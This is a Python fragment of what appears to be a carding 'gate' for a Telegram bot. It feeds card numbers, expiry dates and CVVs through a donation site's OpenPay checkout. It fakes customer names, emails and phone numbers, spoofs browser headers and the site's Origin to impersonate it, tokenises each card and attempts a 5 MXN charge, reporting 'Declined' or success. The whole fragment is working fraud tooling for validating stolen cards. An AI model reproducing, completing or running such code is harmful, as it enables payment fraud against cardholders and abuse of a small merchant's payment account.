# Pure gate motor for 'op' — no Telegram-bot dependency.
...
_HDR = {'Host': 'api.openpay.mx', 'Connection': 'keep-alive', 'sec-ch-ua-platform': '"Android"', 'Authorization': 'Basic cGtfZDA0YjlkYTM1YTEyNGZiY2IzMmYzMmU5YmI5NjQ4MGE6', 'User-Agent': _UA, 'Accept': 'application/json', 'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"', 'Content-Type': 'application/json', 'sec-ch-ua-mobile': '?1', 'Sec-GPC': '1', 'Accept-Language': 'es-MX,es;q=0.9', 'Origin': 'https://reservacuxtal.com', 'Referer': 'https://reservacuxtal.com/'}
...
def _flow(num, mes, ano, cvv):
    ...
    for _ in range(3):
        try:
            ...
            ord_id = _od()
            ml = _em()
            data = {'amount': 5, 'currency': 'MXN', 'description': 'Fondo Verde Reserva Cuxtal', 'order_id': ord_id, 'send_email': 'false', 'customer': {'name': fsn, 'last_name': lst, 'phone_number': _tl(), 'email': ml}, 'redirect_url': f'https://reservacuxtal.com/openpay/success-payment.php?name={fsn}&email={ml}&description=Fondo%20Verde%20Reserva%20Cuxtal&order_id={ord_id}'}
            r1 = sess.post('https://api.openpay.mx/v1/mjserb9p38pujar5l3rn/public-checkouts', headers=_HDR, json=data, timeout=20).json()
            ord_id2 = r1.get('id')
            link = r1.get('checkout_link')
            if not ord_id2:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | No Order ID'}
            r2 = sess.post('https://api.openpay.mx/v1/mjserb9p38pujar5l3rn/tokens', headers=_HDR, json={'expiration_month': mes, 'expiration_year': ano, 'holder_name': f'{fsn} {lst}', 'card_number': num, 'cvv2': cvv}, timeout=20).json()
            token = r2.get('id')
            if not token:
            ...
            data = f'tokenId={token}&transactionId={tdI}&checkoutId={ord_id2}&deviceSessionId={_dv()}&browserScreenHeight=306&browserScreenWidth=619&browserUserAgent={_UA}&browserLanguage=es-MX&browserJavaEnabled=false&browserJavaScriptEnabled=true&useCof=false'
            r5 = sess.post('https://api.openpay.mx/v1/card-payment/charge', headers={**_HDR, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data=data, timeout=20)
